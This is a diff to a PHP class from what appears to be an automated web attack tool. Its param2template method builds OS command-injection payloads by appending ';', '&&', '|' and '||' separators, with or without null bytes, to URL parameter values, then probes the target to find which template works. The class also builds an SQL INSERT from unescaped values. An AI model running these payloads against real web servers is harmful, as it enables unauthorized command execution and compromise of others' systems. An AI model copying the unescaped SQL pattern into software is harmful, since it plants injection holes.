@@ -74,7 +74,12 @@ class PARAM4COM extends URL{
                 $sql_w = "INSERT INTO URI (id8port,vhost,path,param) VALUES ('$this->port2id','$this->vhost','$this->uri_path','$this->param'); ";
                 $this->mysql_ressource->query($sql_w);
                 //echo "$sql_w\n";
-               echo $this->note("Working on PARAM:$this->param");
+               echo $this->note("Working on PARAM:$this->param for the first time");
+            }
+            
+            if (!$this->web2check_200()){
+                $chaine = "Unreachable URL";
+                return $this->rouge($chaine);
             }
         
         
@@ -132,28 +137,28 @@ class PARAM4COM extends URL{
     public function param2template($cmd,$filter){
         $this->ssTitre(__FUNCTION__);
         $url_template = "";
-        $cmd_exec = "$this->value; $cmd";
+        $cmd_exec = "; $cmd";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
             return $url_template;
         }
         
-        $cmd_exec = "$this->value; $cmd$this->null_byte";
+        $cmd_exec = "; $cmd$this->null_byte";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
             return $url_template;
         }
         
-        $cmd_exec = "$this->value && $cmd";
+        $cmd_exec = " && $cmd";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value&& ")."%CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
             return $url_template;
         }
         
-        $cmd_exec = "$this->value && $cmd$this->null_byte";
+        $cmd_exec = " && $cmd$this->null_byte";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value&& ")."%CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
@@ -161,28 +166,28 @@ class PARAM4COM extends URL{
         }
         
         
-        $cmd_exec = "$this->value | $cmd";
+        $cmd_exec = " | $cmd";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value | ")."%CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
             return $url_template;
         }
         
-        $cmd_exec = "$this->value | $cmd$this->null_byte";
+        $cmd_exec = " | $cmd$this->null_byte";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value | ")."%CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
             return $url_template;
         }
         
-        $cmd_exec = "$this->value || $cmd";
+        $cmd_exec = " || $cmd";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value || ")."%CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
             return $url_template;
         }
         
-        $cmd_exec = "$this->value || $cmd$this->null_byte";
+        $cmd_exec = " || $cmd$this->null_byte";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value || ")."%CMD%%NB%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
         if (!empty($this->param2check($this->user2agent,$url,$filter))) {
